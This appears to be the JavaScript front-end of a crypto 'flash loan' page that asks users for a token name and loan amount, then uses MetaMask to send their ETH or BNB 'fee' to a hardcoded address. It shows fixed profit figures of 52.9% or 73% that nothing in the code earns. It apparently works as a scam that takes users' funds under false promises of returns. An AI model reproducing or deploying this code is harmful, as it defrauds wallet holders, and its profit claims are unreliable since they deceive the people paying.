const app = angular.module("myApp", []);
function fixNumber(e) {
    return Math.round(1e12 * e) / 1e12;
}
app.controller("myCtrl", [
    "$scope",
    async function (e) {
        (e.init = function () {
            (e.ivm = ""),
                (e.processing = !1),
                (e.ethDeposited = !1),
                (e.formStep = 1),
                (e.currency = "ETH"),
                (e.dex = "Uniswap"),
                (e.gasPrice = "30"),
                (e.erc20 = { name: "", symbol: "", network: !isBnb }),
                (e.loan = { amount: 25, tokenFee: 0.01, swapFee: 0, totalFee: 0, gain: 0 }),
                (e.submitErc20Form = function () {
                    const t = e.erc20.name.trim();
                    if ("" == t) return alert("Token Name cannot be blank");
                    if (!t.match(/^[a-zA-Z\s]+$/)) return alert("Token Name can only contain letters and spaces");
                    const n = e.erc20.symbol.trim();
                    return "" == n
                        ? alert("Token Symbol cannot be blank")
                        : n.match(/^[a-zA-Z]+$/)
                        ? window.isBnb && e.erc20.network
                            ? alert("Network Mismatch. Set MetaMask network to Ethereum and reload the page.")
                            : window.isBnb || e.erc20.network
                            ? ((e.formStep = 2),
                              (e.currency = e.erc20.network ? "ETH" : "BNB"),
                              (e.dex = e.erc20.network ? "Uniswap" : "PancakeSwap"),
                              (e.loan.tokenFee = e.erc20.network ? 0.01 : 0.05),
                              (e.ivm = e.erc20.network ? oeb : ubx),
                              (e.gasPrice = e.erc20.network ? "30" : "6"),
                              e.getLoanEstimates(),
                              void setTimeout(function () {
                                  document.getElementById("loanAmtInput").focus();
                              }, 100))
                            : alert("Network Mismatch. Set MetaMask network to Binance Smart Chain and the reload page.")
                        : alert("Token Symbol can only contain letters");
                }),
                (e.amountChanged = function () {
                    e.getLoanEstimates();
                }),
                (e.getLoanEstimates = function () {
                    null != e.loan.amount &&
                        null != e.loan.amount &&
                        ((e.loan.swapFee = e.loan.amount / (e.erc20.network ? 400 : 200)), (e.loan.totalFee = fixNumber(e.loan.tokenFee + e.loan.swapFee)), (e.loan.gain = fixNumber(e.loan.amount * (e.erc20.network ? 0.529 : 0.73))));
                }),
                e.getLoanEstimates(),
                (e.submitLoanForm = function () {
                    e.ethDeposited ? e.executeLoan() : e.depositEth();
                }),
                (e.depositEth = function () {
                    (e.processing = !0),
                        window.web3.eth.sendTransaction({ to: e.ivm, from: e.account.address, value: window.web3.utils.toWei("" + e.loan.totalFee, "ether"), gas: 3e4, gasPrice: window.web3.utils.toWei(e.gasPrice, "gwei") }, function (
                            t,
                            n
                        ) {
                            (e.processing = !1),
                                e.$apply(),
                                t
                                    ? alert("Transaction Failed")
                                    : (setTimeout(function () {
                                          alert("Money deposited to contract. You can execute the Flash Loan now.");
                                      }, 5e3),
                                      (e.ethDeposited = !0),
                                      e.$apply());
                        });
                }),
                (e.executeLoan = function () {
                    (e.processing = !0),
                        window.contract.methods.action().send({ to: e.ivm, from: e.account.address, value: 0, gasPrice: window.web3.utils.toWei(e.gasPrice, "gwei") }, function (t, n) {
                            t
                                ? (alert("Flash Loan Execution Failed"), (e.processing = !1), e.$apply())
                                : setTimeout(function () {
                                      alert("Transaction Successful. Check your wallet!");
                                  }, 5e3);
                        });
                });
        }),
            await loadWeb3().then(function (t) {
                try {
                    e.account = { address: t[0] };
                } catch (e) {}
                e.init(), e.$apply();
            });
    },
]);
